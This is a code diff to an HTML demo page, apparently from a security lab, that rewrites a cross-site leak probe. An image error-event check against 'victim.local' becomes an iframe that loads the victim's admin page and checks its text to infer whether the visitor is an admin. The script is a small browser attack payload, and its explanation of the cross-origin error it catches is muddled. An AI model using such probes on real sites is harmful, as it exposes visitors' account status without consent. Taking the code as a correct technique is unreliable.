@@ -3,17 +3,38 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Error Events XS-Leak Attack</title>
+    <title>XS-Leak Attack: Admin Access Detection</title>
 </head>
 <body>
-    <h1>Error Events XS-Leak Attack</h1>
+    <h1>XS-Leak Attack: Admin Access Detection</h1>
+
     <script>
-        const img = document.createElement('img');
-        img.src = "http://victim.local/non-existent-image.png";
-        img.onerror = () => {
-            console.log('Error event triggered');
-        };
-        document.body.appendChild(img);
+        // Function to test admin access
+        function testAdminAccess() {
+            const iframe = document.createElement('iframe');
+            iframe.src = "http://victim.local:8080/admin/index.html";
+            document.body.appendChild(iframe);
+
+            iframe.onload = function() {
+                try {
+                    const content = iframe.contentWindow.document.body.innerHTML;
+
+                    // Check for specific keywords to detect admin access
+                    if (content.includes('Welcome, Admin!')) {
+                        console.log("Admin access detected (victim is an admin)");
+                    } else if (content.includes('Access Denied')) {
+                        console.log("No admin access detected (victim is not an admin)");
+                    } else {
+                        console.log("Unexpected content loaded");
+                    }
+                } catch (e) {
+                    console.log("Cross-Origin Read Blocked - XS-Leak Detected via Cross-Origin Inference");
+                }
+            };
+        }
+
+        // Simulate the XS-Leak attack
+        testAdminAccess();
     </script>
 </body>
 </html>
